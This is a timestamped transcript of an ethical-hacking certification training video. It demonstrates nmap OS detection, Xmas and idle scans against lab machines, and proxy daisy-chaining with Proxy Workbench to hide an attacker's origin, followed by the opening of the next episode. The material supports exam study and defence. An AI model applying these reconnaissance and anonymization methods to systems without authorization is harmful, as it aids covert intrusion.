the right identification\nin the right area, essentially, but\n\n641\n00:31:43.020 --> 00:31:47.150\nbecause the OS gives out a code that\nessentially could identify it as multiple\n\n642\n00:31:47.150 --> 00:31:50.710\nOS's, it's not sure which one so\nit says hey, it could be one of these, and\n\n643\n00:31:50.710 --> 00:31:52.650\nso it comes back and tells us that.\n\n644\n00:31:52.650 --> 00:31:55.935\nAnd the information that's specifically\nis giving us that is right down below.\n\n645\n00:31:55.935 --> 00:31:59.979\nThe OSCPE where it gives us multiple\ninformation items that come back with\n\n646\n00:31:59.979 --> 00:32:01.162\ndifferent OS types.\n\n647\n00:32:01.162 --> 00:32:04.367\nThat's why,\nit's registering three OS details there.\n\n648\n00:32:04.367 --> 00:32:08.325\nIt's showing us that, it seems that there\nare again, potentially multiple operating\n\n649\n00:32:08.325 --> 00:32:11.370\nsystem types it could be, but\nit's narrowing it down for us.\n\n650\n00:32:11.370 --> 00:32:14.410\nIt does show us that we have update,\nWindows 8.1 update 1.\n\n651\n00:32:14.410 --> 00:32:19.470\nSo it does indicate likely, very likely\nthe most recent version of the OS, and\n\n652\n00:32:19.470 --> 00:32:21.520\nit's showing us the script results.\n\n653\n00:32:21.520 --> 00:32:24.784\nThe NB stat information\nfrom that bio client,\n\n654\n00:32:24.784 --> 00:32:26.670\nit's giving us some\nadditional information.\n\n655\n00:32:26.670 --> 00:32:29.130\nIt also gives us a trace\nroute at the very bottom.\n\n656\n00:32:29.130 --> 00:32:30.495\nNow, it's on the same subnet,\nwe're getting nothing.\n\n657\n00:32:30.495 --> 00:32:31.330\n>> The one hop, yeah [LAUGH].\n\n658\n00:32:31.330 --> 00:32:34.978\n>> Other than a, hey, you're sitting\nnext door to me, on the same machine but\n\n659\n00:32:34.978 --> 00:32:37.400\nwe essentially can see everything there.\n\n660\n00:32:37.400 --> 00:32:43.128\nNow, if we wanted to do a,\nlet's do a Xmas scan, right?\n\n661\n00:32:43.128 --> 00:32:45.888\nSo we can go in and\nwe can do something like that.\n\n662\n00:32:45.888 --> 00:32:51.440\nWe're gonna do a -s for scan,\nscan type X for Xmas, capital X for Xmas.\n\n663\n00:32:51.440 --> 00:32:53.850\nSo we would have to know our\nswitches here, right, and\n\n664\n00:32:53.850 --> 00:32:55.970\nunderstand what it is we want to do.\n\n665\n00:32:55.970 --> 00:33:00.790\nWe're then going to go ahead and\nkeep doing underscore.\n\n666\n00:33:00.790 --> 00:33:05.515\nDo that, there we go and then,\nwe're gonna do the IP address of\n\n667\n00:33:05.515 --> 00:33:13.040\n10.1.230.223 and we're going to hit Enter.\n\n668\n00:33:13.040 --> 00:33:18.768\nWe're gonna do aggressive on\nthe timing here, capital space in the.\n\n669\n00:33:18.768 --> 00:33:21.120\n>> [LAUGH]\n>> Let me try that again.\n\n670\n00:33:21.120 --> 00:33:24.870\nIn the script,\nwhen I typed in space capital minus T4,\n\n671\n00:33:24.870 --> 00:33:27.134\nwe're setting an aggressive\ntiming factor there.\n\n672\n00:33:27.134 --> 00:33:32.490\nSo we're gonna go out and really try to\ndo this and have it do aggressive scans,\n\n673\n00:33:32.490 --> 00:33:34.350\nso that way it's gonna be quick and dirty.\n\n674\n00:33:34.350 --> 00:33:35.190\nIt's gonna be noisy.\n\n675\n00:33:35.190 --> 00:33:38.450\nIt's gonna go in there and just hit\nthe box hard and it's gonna come back and\n\n676\n00:33:38.450 --> 00:33:39.380\nreturn that for us.\n\n677\n00:33:39.380 --> 00:33:42.280\n>> But if you're doing a white box\ntest and you weren't worried about\n\n678\n00:33:42.280 --> 00:33:45.050\nbeing detected, this is the way\nto get the quickest results.\n\n679\n00:33:45.050 --> 00:33:45.950\n>> Exactly, you could see it\n\n680\n00:33:45.950 --> 00:33:48.420\nliterally by the time you said\nthat the scan already came back.\n\n681\n00:33:48.420 --> 00:33:49.821\n>> Right, okay.\n>> Right, very quick and\n\n682\n00:33:49.821 --> 00:33:51.870\nyou can see it said m app scan report.\n\n683\n00:33:51.870 --> 00:33:53.220\nHost is up, so we know that.\n\n684\n00:33:53.220 --> 00:33:56.329\nWe got three thousandths\nof a second latency.\n\n685\n00:33:56.329 --> 00:33:58.600\n>> [LAUGH]\n>> Because it's running next door\n\n686\n00:33:58.600 --> 00:34:01.010\non the same physical host,\nrunning as a VM.\n\n687\n00:34:01.010 --> 00:34:04.438\nAll 1,000 scan ports are closed and\nit gives us the MAC address.\n\n688\n00:34:04.438 --> 00:34:08.100\nMeaning the ports I scanned are not\nopened, but it comes back and\n\n689\n00:34:08.100 --> 00:34:09.660\ntells us the host is up, right?\n\n690\n00:34:09.660 --> 00:34:12.080\nSo, that does tell us\nwhether ports are opened.\n\n691\n00:34:12.080 --> 00:34:15.320\nAs you said, it's gonna come back and\nbe a very quick scan but\n\n692\n00:34:15.320 --> 00:34:17.610\nit's gonna come back and\ngive us some quick information.\n\n693\n00:34:17.610 --> 00:34:19.950\nWe can do the same thing with a UDP scan.\n\n694\n00:34:19.950 --> 00:34:22.650\nWe can do the same thing\nhere with a idle scan.\n\n695\n00:34:22.650 --> 00:34:25.340\nLet's go in just quickly and\ntake a look at an idle scan.\n\n696\n00:34:25.340 --> 00:34:27.460\nThat's one we hadn't done\non the other one before.\n\n697\n00:34:27.460 --> 00:34:31.397\nSo we'll do that, we'll do PN,\n\n698\n00:34:31.397 --> 00:34:35.680\nwe'll do a port map on port 80.\n\n699\n00:34:35.680 --> 00:34:38.910\nThen, we'll go ahead and we'll do, we\n\n700\n00:34:41.120 --> 00:34:47.510\nneed the IP address of the machine,\nso we'll go ahead and put that in.\n\n701\n00:34:47.510 --> 00:34:52.659\nLet's do s and we'll do\n\n702\n00:34:52.659 --> 00:34:59.362\n10.1.230.223.\n\n703\n00:34:59.362 --> 00:35:04.481\nGo ahead and we'll do that and\nmap comes back, let me see here,\n\n704\n00:35:04.481 --> 00:35:08.840\nso we did the idle scan and\nno targets were specified.\n\n705\n00:35:08.840 --> 00:35:14.067\nI thought I specified a target,\nlet me try that one more time.\n\n706\n00:35:14.067 --> 00:35:17.470\nAnd then, didn't I do that?\n\n707\n00:35:17.470 --> 00:35:18.280\nI know why [LAUGH].\n\n708\n00:35:18.280 --> 00:35:20.370\nI only put one IP address in.\n\n709\n00:35:20.370 --> 00:35:21.380\nOkay, that's why.\n\n710\n00:35:21.380 --> 00:35:22.410\nSo, let me do this.\n\n711\n00:35:22.410 --> 00:35:23.370\nWhat's my range?\n\n712\n00:35:23.370 --> 00:35:24.558\nLet me do this.\n\n713\n00:35:24.558 --> 00:35:29.136\nLet's do 231 and\n\n714\n00:35:29.136 --> 00:35:38.300\nthen we'll do 10.1.230.8.\n\n715\n00:35:38.300 --> 00:35:41.430\nI think we had machines on that first\npart of the range there, right?\n\n716\n00:35:41.430 --> 00:35:43.920\nAll right, so we'll give it couple\nof machines to go out and bracket.\n\n717\n00:35:43.920 --> 00:35:45.770\nI just basically said go\nafter this one machine.\n\n718\n00:35:45.770 --> 00:35:47.320\nIt's expecting a range.\n\n719\n00:35:47.320 --> 00:35:48.570\nSo we're gonna wait for it to go out.\n\n720\n00:35:48.570 --> 00:35:50.560\nI think there were a couple of machines\non the beginning of that range\n\n721\n00:35:50.560 --> 00:35:51.310\non the Gateway.\n\n722\n00:35:51.310 --> 00:35:53.370\nSo we should get some information there.\n\n723\n00:35:53.370 --> 00:35:57.320\nSo it looks like we're not\ngetting anything back,\n\n724\n00:35:57.320 --> 00:35:59.830\nbecause chances are good\nthose have firewalls running.\n\n725\n00:35:59.830 --> 00:36:02.340\nThose are not ones I control or\nI'd drop the firewall, but\n\n726\n00:36:02.340 --> 00:36:03.978\nthis does tells us\nsomething really important.\n\n727\n00:36:03.978 --> 00:36:07.580\nCuz it does come back and say hey, perhaps\nthis host is either down or firewalled.\n\n728\n00:36:07.580 --> 00:36:09.580\nWhich means that we're not\nable to get a response,\n\n729\n00:36:09.580 --> 00:36:12.322\nbecause probably blocking\nthe inbound scan.\n\n730\n00:36:12.322 --> 00:36:15.560\nBut it's also very important because\nit does tell us that the host\n\n731\n00:36:15.560 --> 00:36:16.610\nis there, right?\n\n732\n00:36:16.610 --> 00:36:18.180\nBut the host is being protected.\n\n733\n00:36:18.180 --> 00:36:19.344\nIf I scan the machine without a firewall,\n\n734\n00:36:19.344 --> 00:36:20.885\nit would actually get ports\nback coming the other way.\n\n735\n00:36:20.885 --> 00:36:24.302\nSo that's something also to consider\nwith a scan like this, right?\n\n736\n00:36:24.302 --> 00:36:25.224\nWhat were you saying?\n\n737\n00:36:25.224 --> 00:36:29.202\n>> Well, I was gonna say, with the CEH,\nthe Certified Ethical Hacker of\n\n738\n00:36:29.202 --> 00:36:32.800\nEC-Council, they're not\nsuper tool specific.\n\n739\n00:36:32.800 --> 00:36:36.053\nBecause there's so\nmany choices of what tool you want to use.\n\n740\n00:36:36.053 --> 00:36:38.637\nBut NMap is one that they\ndo seem to focus on and\n\n741\n00:36:38.637 --> 00:36:41.620\nactually call out a few of the switches,\nright?\n\n742\n00:36:41.620 --> 00:36:43.550\n>> They do and\nthat's why we spend sometime,\n\n743\n00:36:43.550 --> 00:36:46.250\nwant to show it to you and\nobviously take a look.\n\n744\n00:36:46.250 --> 00:36:47.730\n>> Just want to make sure\nour viewers are aware.\n\n745\n00:36:47.730 --> 00:36:49.054\n>> Show it to you and take a look here,\n\n746\n00:36:49.054 --> 00:36:52.120\nyou're supposed to tell me when you're\ngonna do that so I know to move.\n\n747\n00:36:52.120 --> 00:36:55.570\nSo that we know and obviously yeah,\nwe want to take a look at NMap,\n\n748\n00:36:55.570 --> 00:36:57.160\nwe want to take a look at the switches.\n\n749\n00:36:57.160 --> 00:37:01.650\nAnd went out of our way to have Mike pull\nup the help page earlier, if you remember.\n\n750\n00:37:01.650 --> 00:37:02.640\nShow you all those scans.\n\n751\n00:37:02.640 --> 00:37:04.026\nSay hey, why don't you go there.\n\n752\n00:37:04.026 --> 00:37:05.570\nYou can read up on them,\ntake a look at them.\n\n753\n00:37:05.570 --> 00:37:07.610\nYou can learn about\nthe switches there as well.\n\n754\n00:37:07.610 --> 00:37:11.148\nShowed you that there were switches\nin the, as you puointed out,\n\n755\n00:37:11.148 --> 00:37:13.080\ngreat advice, in the zenmap maps.\n\n756\n00:37:13.080 --> 00:37:16.220\nSo, that you can actually see in the port\nthat we could see all the switches in\n\n757\n00:37:16.220 --> 00:37:17.420\nWindows and learn them.\n\n758\n00:37:17.420 --> 00:37:19.110\nDefinitely a good\ninvestment of your time and\n\n759\n00:37:19.110 --> 00:37:22.250\nenergy from the studying perspective\nto take a look at those ports.\n\n760\n00:37:22.250 --> 00:37:23.990\nExcuse me, take a look at those scans.\n\n761\n00:37:23.990 --> 00:37:25.430\nTake a look at those switches.\n\n762\n00:37:25.430 --> 00:37:26.520\nKnow what they are.\n\n763\n00:37:26.520 --> 00:37:28.910\nThere is definitely case\nsensitivity in a tool like this.\n\n764\n00:37:28.910 --> 00:37:31.978\nSo capital s,\nlowercase s may do very different things.\n\n765\n00:37:31.978 --> 00:37:34.650\nYou'd want tp pay special attention\n\n766\n00:37:34.650 --> 00:37:36.660\nto the differences where\nthere is case sensitivity.\n\n767\n00:37:36.660 --> 00:37:40.740\nAnd we may try to catch you on hey, what's\nthat capital versus non capital function.\n\n768\n00:37:40.740 --> 00:37:42.170\nI want to talk about that.\n\n769\n00:37:42.170 --> 00:37:43.050\nI do want to go back and\n\n770\n00:37:43.050 --> 00:37:46.690\ndo one more thing in the lab environment,\nbefore we actually get done.\n\n771\n00:37:46.690 --> 00:37:50.760\nI wanted to show you a proxy\ndaisy chaining tool.\n\n772\n00:37:50.760 --> 00:37:53.220\nAnd just talk a bit about\nhow that may work and\n\n773\n00:37:53.220 --> 00:37:56.830\nwhat that may be, cuz that's also\na really important set of skills.\n\n774\n00:37:56.830 --> 00:37:58.760\nWhen we're using a proxy or\n\n775\n00:37:58.760 --> 00:38:02.180\nsetting up software specifically\nthat will let us daisy chain.\n\n776\n00:38:02.180 --> 00:38:06.740\nTo essentially hide between a set\nof proxies that anonymize and\n\n777\n00:38:06.740 --> 00:38:10.610\npotentially, prevent people from\nseeing what it is that we are doing.\n\n778\n00:38:10.610 --> 00:38:12.510\nAnd where we're doing it from,\nmost importantly.\n\n779\n00:38:12.510 --> 00:38:15.120\nNot so much what we're doing,\nbut where we're doing it from.\n\n780\n00:38:15.120 --> 00:38:17.782\nSo what I want to do is,\ngo back to the Windows 8.1 box.\n\n781\n00:38:17.782 --> 00:38:21.006\nWe'll do that here,\njust log back in real quick, cuz again,\n\n782\n00:38:21.006 --> 00:38:22.310\nit does tend to time out.\n\n783\n00:38:24.020 --> 00:38:25.110\nSo, let's do that.\n\n784\n00:38:26.760 --> 00:38:28.850\nType in the right password.\n\n785\n00:38:28.850 --> 00:38:31.310\nSuper secret, super stealthy password.\n\n786\n00:38:31.310 --> 00:38:34.240\nPassword, password, and\nthen what we're gonna do is,\n\n787\n00:38:34.240 --> 00:38:37.280\nwe already have a tool set\nup here I've installed.\n\n788\n00:38:37.280 --> 00:38:39.230\nI just have a shortcut to it down here,\nso I'm gonna load it.\n\n789\n00:38:39.230 --> 00:38:42.620\nGive it a second,\nProxy Workbench is the tool.\n\n790\n00:38:42.620 --> 00:38:43.860\nAgain, available free of charge.\n\n791\n00:38:43.860 --> 00:38:45.080\nYou go out and grab this.\n\n792\n00:38:45.080 --> 00:38:46.140\nThere are many of them out there.\n\n793\n00:38:46.140 --> 00:38:51.210\nThere's Daisy Chainer and\nProxy Workbench and all sorts of tools.\n\n794\n00:38:51.210 --> 00:38:55.230\nThis is an eval period here, so\nit says hey, you can use this for\n\n795\n00:38:55.230 --> 00:38:58.130\na period of time,\nwelcome to the Proxy Workbench.\n\n796\n00:38:58.130 --> 00:39:01.310\nSays hey you may want to know about\nthis stuff to get started, great.\n\n797\n00:39:01.310 --> 00:39:02.160\nTake a look at that.\n\n798\n00:39:03.650 --> 00:39:07.320\nYou go out to ProxyWorkbench.com, by the\nway, if you want to download the software,\n\n799\n00:39:07.320 --> 00:39:09.120\nso Mike will capture that for you.\n\n800\n00:39:09.120 --> 00:39:12.220\nSo we get a little\nconfiguration window here.\n\n801\n00:39:12.220 --> 00:39:13.210\nHow do we set this up?\n\n802\n00:39:13.210 --> 00:39:14.370\nWhat do we want to do?\n\n803\n00:39:14.370 --> 00:39:19.580\nWe may want to go ahead and we may want\nto configure one or more settings.\n\n804\n00:39:19.580 --> 00:39:21.040\nSo let's take a look at this.\n\n805\n00:39:21.040 --> 00:39:27.660\nSo, we'll highlight here the,\nin this case, SMTP is highlighted.\n\n806\n00:39:27.660 --> 00:39:29.930\nWe have a protocol assigned to this port.\n\n807\n00:39:29.930 --> 00:39:33.190\nWhat are we gonna do with it, so we can\nspecify how we're gonna work that and\n\n808\n00:39:33.190 --> 00:39:34.680\nhow we're gonna set that up?\n\n809\n00:39:34.680 --> 00:39:38.936\nAnd we can go ahead and with any of them,\nwe could configure the paths through.\n\n810\n00:39:38.936 --> 00:39:42.690\nWe can configure the configuration\non this specific port combination\n\n811\n00:39:42.690 --> 00:39:44.200\nby clicking Configure.\n\n812\n00:39:44.200 --> 00:39:47.260\nAnd there may be different settings\ndepending on what we're looking at.\n\n813\n00:39:47.260 --> 00:39:49.100\nThis one has a remote server.\n\n814\n00:39:49.100 --> 00:39:50.607\nWhat port are we connecting with.\n\n815\n00:39:50.607 --> 00:39:54.831\nIf we look at something like port 8080 and\nwe go here and configure that,\n\n816\n00:39:54.831 --> 00:39:58.333\nthat's gonna have some additional\ninformation on the proxy.\n\n817\n00:39:58.333 --> 00:40:01.233\nWe may specify another\nproxy to bounce through.\n\n818\n00:40:01.233 --> 00:40:05.093\nSo the idea is you wanna daisy chain these\nproxies by saying go to this machine and\n\n819\n00:40:05.093 --> 00:40:08.678\nthen proxy from there, and\nthen that one would be running this tool.\n\n820\n00:40:08.678 --> 00:40:12.970\nAnd so we'd established three or\nfour ghost boxes that are propositioned in\n\n821\n00:40:12.970 --> 00:40:16.350\ndifferent areas,\nremotely controlled most likely.\n\n822\n00:40:16.350 --> 00:40:19.360\nAnd, you may have seen this\nin movies before or TV shows,\n\n823\n00:40:19.360 --> 00:40:23.140\nwhere they try to do a search on\nthe other person that's hacking in.\n\n824\n00:40:23.140 --> 00:40:26.250\nOkay, wait, keep them on the line so I can\nsee where they're coming from, and they\n\n825\n00:40:26.250 --> 00:40:30.290\nwork backwards trying bounce through the\nsatellite to find the connection point.\n\n826\n00:40:30.290 --> 00:40:33.815\nAnd, okay, he's there, no, he's there,\nand they're going through the proxies,\n\n827\n00:40:33.815 --> 00:40:36.390\nknocking them down,\ntrying to find out where you are.\n\n828\n00:40:36.390 --> 00:40:40.538\nThat's because they've set a series\nof these ghost boxes running software\n\n829\n00:40:40.538 --> 00:40:44.490\nlike this that are on point in different\ngeographies, different IPs and\n\n830\n00:40:44.490 --> 00:40:49.026\nthey are all essentially provisioned the\nsame way where we're gonna make them into\n\n831\n00:40:49.026 --> 00:40:49.570\na proxy.\n\n832\n00:40:49.570 --> 00:40:52.380\nAnd then, from that box we're\ngonna jump a proxy to another box.\n\n833\n00:40:52.380 --> 00:40:55.740\nAnd so, they're literally just jumping off\npoints to be able to do the connection.\n\n834\n00:40:55.740 --> 00:41:01.440\nSo I connect from my machine behind this\nentire set of walls, and I outbound.\n\n835\n00:41:01.440 --> 00:41:04.170\nBut I outbound to the first machine\nthat I'm going to proxy through.\n\n836\n00:41:04.170 --> 00:41:07.570\nThat machine daisy chains to another\nmachine, to another, to another.\n\n837\n00:41:07.570 --> 00:41:10.290\nYou remember years ago, you saw this\ncommercial, I think it was Pantene or\n\n838\n00:41:10.290 --> 00:41:13.480\nsomething, where they'll tell two friends,\nand they'll tell two friends, and so on?\n\n839\n00:41:13.480 --> 00:41:14.660\nAnd you know the screen got bigger?\n\n840\n00:41:14.660 --> 00:41:16.200\n>> Yep.\n>> So you would have 6, 8, 10,\n\n841\n00:41:16.200 --> 00:41:18.030\n12 of these in front of you.\n\n842\n00:41:18.030 --> 00:41:22.390\nYou would not target the last machine,\nyou would target the first machine, and\n\n843\n00:41:22.390 --> 00:41:24.960\nthen all those machines\nwill chain through, and\n\n844\n00:41:24.960 --> 00:41:28.420\nthen push your traffic out to\nthe web through the whole series.\n\n845\n00:41:28.420 --> 00:41:29.680\n>> Right.\n>> But by the time you get out,\n\n846\n00:41:29.680 --> 00:41:31.270\nwe try to identify you.\n\n847\n00:41:31.270 --> 00:41:33.390\nAll we see is the first\nproxy in the chain.\n\n848\n00:41:33.390 --> 00:41:35.260\nThe last proxy you connected through,\n\n849\n00:41:35.260 --> 00:41:37.930\nwe'd have to knock down 12\nproxies to get back to you.\n\n850\n00:41:37.930 --> 00:41:38.430\n>> Right.\n\n851\n00:41:38.430 --> 00:41:41.610\n>> And literally, I can be sitting in\nthe same network as the last machine\n\n852\n00:41:41.610 --> 00:41:42.580\nright next to it.\n\n853\n00:41:42.580 --> 00:41:44.890\nYou could never tell because all\nyou would see is the first machine.\n\n854\n00:41:44.890 --> 00:41:46.730\n>> Mm.\n>> So this allows me to anonymize or\n\n855\n00:41:46.730 --> 00:41:51.030\nghost my machine essentially, totally\nstealthing who I am and where I come from.\n\n856\n00:41:51.030 --> 00:41:55.060\nVery effective tool when we're doing\nPIN testing, when we're doing hacking,\n\n857\n00:41:55.060 --> 00:41:55.840\nethical or not.\n\n858\n00:41:55.840 --> 00:41:58.555\nCertainly, we're gonna talk about\nethical hacking but the reality is,\n\n859\n00:41:58.555 --> 00:42:04.150\nnon-ethical hackers, bad actors do this\nall the time to be able to stealth their\n\n860\n00:42:04.150 --> 00:42:07.740\norigin to prevent us from seeing\nthem when we're scanning and\n\n861\n00:42:07.740 --> 00:42:09.730\ntrying to find this inbound traffic and\nblock it.\n\n862\n00:42:09.730 --> 00:42:11.320\nIt's a very effective set of tools.\n\n863\n00:42:11.320 --> 00:42:12.850\nVery, very scary set of tools, as well.\n\n864\n00:42:12.850 --> 00:42:14.815\nSo, let me just finish\nthe configuration here.\n\n865\n00:42:14.815 --> 00:42:19.220\nSo we'll go through, we'll just\nessentially connect via another proxy.\n\n866\n00:42:19.220 --> 00:42:20.525\nSo you'd enter the name\nof the proxy server here.\n\n867\n00:42:20.525 --> 00:42:27.184\nSo, we would specify an address,\nwhatever it would be,\n\n868\n00:42:27.184 --> 00:42:32.474\n10.1.230.35 or whatever port.\n\n869\n00:42:32.474 --> 00:42:36.120\nYou would then have to obviously install\nthis software on all those machines,\n\n870\n00:42:36.120 --> 00:42:37.920\nprogramming them out as you go.\n\n871\n00:42:37.920 --> 00:42:40.450\nEach one would be linked to\nthe next one in the chain.\n\n872\n00:42:40.450 --> 00:42:42.740\nSo, we'll just randomly make\none up just to put it in there.\n\n873\n00:42:42.740 --> 00:42:44.700\nSo, we'll do all that when we're done.\n\n874\n00:42:44.700 --> 00:42:46.480\nWe'll then, and by the way,\nwe have settings for\n\n875\n00:42:46.480 --> 00:42:49.470\nall the different protocols we\nmay wanna push traffic through.\n\n876\n00:42:49.470 --> 00:42:51.670\nSo, port 25, port 80, port 21.\n\n877\n00:42:51.670 --> 00:42:54.780\nYou can add in any protocol,\nany port mapping in the tool so\n\n878\n00:42:54.780 --> 00:42:58.670\nyou can stealth some traffic but perhaps\nnot stealth others or stealth at all.\n\n879\n00:42:58.670 --> 00:43:00.170\nIt's really up to you to decide.\n\n880\n00:43:00.170 --> 00:43:04.550\nThen once we start connecting, what we\nwill see is the inbound traffic here and\n\n881\n00:43:04.550 --> 00:43:07.110\noutbound traffic will be recorded,\nAnd we would see the Froman2 and\n\n882\n00:43:07.110 --> 00:43:09.430\nit will show us we're\nconnecting through the proxies.\n\n883\n00:43:09.430 --> 00:43:13.570\nSo, this is actually really kinda\ninteresting stuff because this allows us\n\n884\n00:43:13.570 --> 00:43:18.470\nto go in and to stealth and\nhide our connection,\n\n885\n00:43:18.470 --> 00:43:21.520\nin such a way that in theory,\nnobody will know where we're coming from.\n\n886\n00:43:21.520 --> 00:43:24.940\n>> Absolutely, especially if you start\nputting some of those proxies or\n\n887\n00:43:24.940 --> 00:43:28.520\nusing some of these proxies that are in\ncountries that are less willing to work\n\n888\n00:43:28.520 --> 00:43:32.870\nwith, say, your particular government in\nreleasing log files and things like that.\n\n889\n00:43:32.870 --> 00:43:34.900\n>> Absolutely,\nthere's no doubt about it, and\n\n890\n00:43:34.900 --> 00:43:38.330\nthis is one of the reasons why a lot of,\nand\n\n891\n00:43:38.330 --> 00:43:42.645\nyou pointed out perhaps being in country\nwhere this may be a problem in theory.\n\n892\n00:43:42.645 --> 00:43:43.540\n>> Mm-hm.\n>> A lot\n\n893\n00:43:43.540 --> 00:43:47.700\nof people that are on the web today\nthat are engaging in activity,\n\n894\n00:43:47.700 --> 00:43:50.280\nnot negative activity,\nnot malicious activity, not hackers,\n\n895\n00:43:50.280 --> 00:43:53.140\nbut just think about people that\nare political activists, for instance.\n\n896\n00:43:53.140 --> 00:43:57.220\nMaybe surfing the web in China, trying\nto surf the web legitimately to find\n\n897\n00:43:57.220 --> 00:44:01.280\nreal information, having to go around\nthe censorship that may be involved there,\n\n898\n00:44:01.280 --> 00:44:04.160\nor the government's activities\naround limiting web access.\n\n899\n00:44:04.160 --> 00:44:07.990\nThey use a lot of these proxies to be able\nto surf anonymously and not be caught.\n\n900\n00:44:07.990 --> 00:44:09.400\n>> Yeah.\n>> So they are all legitimate uses for\n\n901\n00:44:09.400 --> 00:44:13.560\nthis that are very important, but they\nalso can be used by us and by others for\n\n902\n00:44:13.560 --> 00:44:14.570\na variety of things.\n\n903\n00:44:14.570 --> 00:44:17.120\nSo we just want to be aware of that and\nwant to obviously understand\n\n904\n00:44:17.120 --> 00:44:20.580\nsome things that are happening here,\nhow we can go through and\n\n905\n00:44:20.580 --> 00:44:23.490\nhow we can use tools like that,\nare gonna be very important.\n\n906\n00:44:23.490 --> 00:44:26.350\nSome of the upcoming tools we'll\nlook at in another episode will be\n\n907\n00:44:26.350 --> 00:44:28.380\ntools like the one I have on screen,\nMegaPing.\n\n908\n00:44:28.380 --> 00:44:29.980\nSo we'll take a look at this,\nwhat it can do.\n\n909\n00:44:29.980 --> 00:44:32.880\nWe're gonna take a look at SuperScan.\n\n910\n00:44:32.880 --> 00:44:35.360\nAt sea ports,\nlooking what ports are current.\n\n911\n00:44:35.360 --> 00:44:37.355\nSea ports, current ports,\nwhat ports are open.\n\n912\n00:44:37.355 --> 00:44:41.370\nWhen we do in numeration, we'll be coming\nin and taking a look at a lot of these and\n\n913\n00:44:41.370 --> 00:44:43.300\nplaying with some additional tools and\n\n914\n00:44:43.300 --> 00:44:45.270\ntaking a look at some additional\nfunctionality, as well.\n\n915\n00:44:45.270 --> 00:44:48.190\n>> All right,\nsomething to look forward to, as always.\n\n916\n00:44:48.190 --> 00:44:51.630\nMore good stuff coming up from Mr.\nAdam Gordon here in our CEH.\n\n917\n00:44:51.630 --> 00:44:55.533\nReally good look there and that's scanning\nand taking a look at some of the tools.\n\n918\n00:44:55.533 --> 00:44:59.140\nWe looked at H ping, and we looked at M\nmap, and a couple others there to get\n\n919\n00:44:59.140 --> 00:45:02.830\nan idea of what it looks like doing these\nscans, results you're going to get back.\n\n920\n00:45:02.830 --> 00:45:04.730\nSo fantastic stuff,\nthank you for that, Adam.\n\n921\n00:45:04.730 --> 00:45:06.070\n>> No problem.\n>> Hope everybody out there\n\n922\n00:45:06.070 --> 00:45:07.030\nenjoyed watching.\n\n923\n00:45:07.030 --> 00:45:09.630\nSigning off IT Pro TV, I'm Mike Roderick.\n\n924\n00:45:09.630 --> 00:45:10.320\n>> I'm Adam Gorick.\n\n925\n00:45:10.320 --> 00:45:11.005\n>> And we will see you next

00:00:20.470\nI'm your host Mike Roderick and\ntoday we're doing our CEH version nine.\n\n4\n00:00:20.470 --> 00:00:24.670\nSpecifically in this episode we're\ncontinuing our thought process,\n\n5\n00:00:24.670 --> 00:00:27.250\nif I could slow down and speak clearly.\n\n6\n00:00:27.250 --> 00:00:31.230\nWe're continuing on our discussion\ncentering around scanning,\n\n7\n00:00:31.230 --> 00:00:34.250\nthat second phase of our attack lifecycle.\n\n8\n00:00:34.250 --> 00:00:37.170\nWe've taken a look at some of\nthe main concepts of scanning.\n\n9\n00:00:37.170 --> 00:00:39.080\nWe've also broken out some tools, and\n\n10\n00:00:39.080 --> 00:00:41.580\nactually showed you\nsome scanning examples.\n\n11\n00:00:41.580 --> 00:00:44.110\nWe're gonna continue on\ntalking about scanning.\n\n12\n00:00:44.110 --> 00:00:49.390\nA little bit about maybe doing some,\nwhere are we gonna go with this one?\n\n13\n00:00:49.390 --> 00:00:52.660\nEvading, trying to hide the fact\nthat we're doing the scanning,\n\n14\n00:00:52.660 --> 00:00:55.150\nand some more advanced scanning concepts.\n\n15\n00:00:55.150 --> 00:00:56.956\nAnd here to help us with that,\nis Mr. Adam Gordon.\n\n16\n00:00:56.956 --> 00:00:57.568\nHow are you doing, Adam?\n\n17\n00:00:57.568 --> 00:00:59.430\n>> Good, good, very good.\n\n18\n00:00:59.430 --> 00:01:00.916\nSo I'm gonna have to live\nup to that introduction.\n\n19\n00:01:00.916 --> 00:01:02.033\n>> [LAUGH].\n>> I was talking about or\n\n20\n00:01:02.033 --> 00:01:03.904\nthinking about talking\nabout counter measures or\n\n21\n00:01:03.904 --> 00:01:06.630\nsome of the other things we can do but\nwe'll incorporate all that stuff.\n\n22\n00:01:06.630 --> 00:01:07.277\n>> Yeah, that's what I meant, yes.\n\n23\n00:01:07.277 --> 00:01:10.843\n>> Mike said we should do as well cuz Mike\nsays that we got to talk about it whether\n\n24\n00:01:10.843 --> 00:01:13.407\nit actually makes sense or\nnot we're just gonna do it So\n\n25\n00:01:13.407 --> 00:01:15.170\nwe'll talk about all that and more.\n\n26\n00:01:15.170 --> 00:01:16.620\nBut let's step back for a minute.\n\n27\n00:01:16.620 --> 00:01:19.690\nWe've been talking prior couple\nof episodes about port scanning.\n\n28\n00:01:19.690 --> 00:01:20.550\nAs Mike said overall,\n\n29\n00:01:20.550 --> 00:01:24.340\nscanning networks, really general\ntheme of this group of episodes.\n\n30\n00:01:24.340 --> 00:01:25.730\nWe took a look at the basic,\n\n31\n00:01:25.730 --> 00:01:30.160\ntalked extensively in the first episode of\nthis series about what scanning implies.\n\n32\n00:01:30.160 --> 00:01:32.220\nWhat it means, how to do network scanning.\n\n33\n00:01:32.220 --> 00:01:37.150\nWhat the value add there is for the CEH in\nterms of the information we can gather.\n\n34\n00:01:37.150 --> 00:01:41.100\nWe spent some time in episode two,\njust before this doing some show and\n\n35\n00:01:41.100 --> 00:01:42.460\ntell as we've come to call it.\n\n36\n00:01:42.460 --> 00:01:48.980\nGoing and looking at the tools as my talk\nabout we took a look at going through and\n\n37\n00:01:48.980 --> 00:01:52.620\nusing Nmap or Zenmap, the Windows end\nNmap, we took at look at h-paying and\n\n38\n00:01:52.620 --> 00:01:55.120\nsome different tools,\ndid a variety of different things there.\n\n39\n00:01:55.120 --> 00:01:59.080\nTo take a look at as well as Wireshark,\nwe didn't really drill down to look at\n\n40\n00:01:59.080 --> 00:02:01.930\nthe packets, we'll do that in\nanother episode as we get into\n\n41\n00:02:01.930 --> 00:02:05.390\nthe use of a tool like that to enumerate\nand to see more about what's there.\n\n42\n00:02:05.390 --> 00:02:08.850\nBut just capturing that traffic,\nlooking at it so we know it's there\n\n43\n00:02:08.850 --> 00:02:12.170\nbecomes very important as part as\nscanning, so we've seen all that.\n\n44\n00:02:12.170 --> 00:02:16.900\nWhat we wanna talk about now, to start\nwith, anyway, is hey, how do we stop this?\n\n45\n00:02:16.900 --> 00:02:19.010\nHow do we defend against, so\nwhat are the 